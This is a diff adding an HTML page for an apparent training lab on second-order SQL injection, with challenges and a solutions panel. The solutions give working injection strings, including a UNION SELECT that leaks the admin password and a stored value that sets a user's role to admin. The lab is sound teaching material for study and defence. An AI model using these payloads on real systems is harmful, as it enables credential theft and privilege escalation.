@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>SQLi Lab 07 — Second-Order Injection</title>
+    <script>
+      (function () {
+        var t = new URLSearchParams(location.search).get("theme");
+        if (t) document.documentElement.dataset.theme = t;
+      })();
+    </script>
+    <link rel="stylesheet" href="../../../css/theme.css" />
+    <link rel="stylesheet" href="../../../css/components.css" />
+    <link rel="stylesheet" href="../../../css/labs.css" />
+  </head>
+  <body>
+    <div class="lab-page">
+      <div class="lab-brand">
+        <strong>SQL INJECTION / LAB 07</strong
+        ><span>Second-Order Injection</span>
+      </div>
+      <div class="lab-container">
+        <h1>Second-Order SQL Injection</h1>
+        <p class="lead">
+          This profile editor sanitizes nothing on save — but nothing dangerous
+          happens on save either. The payload sits quietly in the database until
+          a <em>different</em> request trusts it and builds a query with it.
+          Input sanitization at one layer never protects a value that gets
+          re-used at another.
+        </p>
+
+        <div class="lab-card">
+          <div class="eyebrow">STEP 1 — SAVE A DISPLAY NAME</div>
+          <p class="muted">
+            Update your profile. Nothing is queried with this value on save.
+          </p>
+          <label>Display name</label>
+          <input id="name" class="lab-input" value="alice" autocomplete="off" />
+          <button id="save" class="lab-btn">SAVE PROFILE</button>
+          <div id="save-output"></div>
+        </div>
+
+        <div class="lab-card">
+          <div class="eyebrow">STEP 2 — VIEW A PROFILE</div>
+          <p class="muted">
+            This page builds a query from the stored display name.
+          </p>
+          <label>View profile for (user id)</label>
+          <input id="vid" class="lab-input" value="2" autocomplete="off" />
+          <button id="view" class="lab-btn">VIEW</button>
+          <div id="output"></div>
+        </div>
+
+        <div class="lab-card">
+          <div class="eyebrow">CHALLENGES</div>
+          <div class="challenge">
+            <strong>01 — Make the second query error</strong
+            ><small
+              >Save a display name that breaks the profile query. Nothing
+              happened on save — that's the point.</small
+            >
+          </div>
+          <div class="challenge">
+            <strong>02 — Leak the users table</strong
+            ><small
+              >Use the stored payload to UNION in the admin's password when the
+              profile page runs.</small
+            >
+          </div>
+          <div class="challenge">
+            <strong>03 — Become admin</strong
+            ><small
+              >Your stored value reaches an UPDATE that sets role. Turn alice
+              into an admin.</small
+            >
+          </div>
+          <details class="lab-solutions">
+            <summary>View solutions</summary>
+
+            <div class="solution">
+              <strong>01 — Break the second query</strong>
+              <small>A single quote stored on save, detonated on view.</small>
+              <pre><code>Display name: O'Brien</code></pre>
+              <p class="muted" style="margin: 8px 0 0">
+                The view query becomes <code>WHERE name = 'O'Brien'</code> —
+                unterminated string, SQL error. No sanitization happened at save
+                time.
+              </p>
+            </div>
+
+            <div class="solution">
+              <strong>02 — Leak the password</strong>
+              <small
+                >Payload stored now, fired later, UNIONed in when the profile
+                page runs.</small
+              >
+              <pre><code>Display name: x' UNION SELECT id, name, password, role FROM users WHERE name='admin' --</code></pre>
+            </div>
+
+            <div class="solution">
+              <strong>03 — Privilege escalation</strong>
+              <small>The stored value reaches a role-update statement.</small>
+              <pre><code>Display name: x', role='admin' WHERE name='alice' --</code></pre>
+              <p class="muted" style="margin: 8px 0 0">
+                On save, the app builds
+                <code
+                  >UPDATE users SET name='&lt;input&gt;' WHERE
+                  id=&lt;id&gt;</code
+                >. Your payload turns that into a second statement that also
+                flips the role.
+              </p>
+            </div>
+          </details>
+          <button id="reset" class="lab-btn secondary">RESET</button>
+        </div>
+
+        <script src="script.js"></script>
+      </div>
+    </div>
+  </body>
+</html>
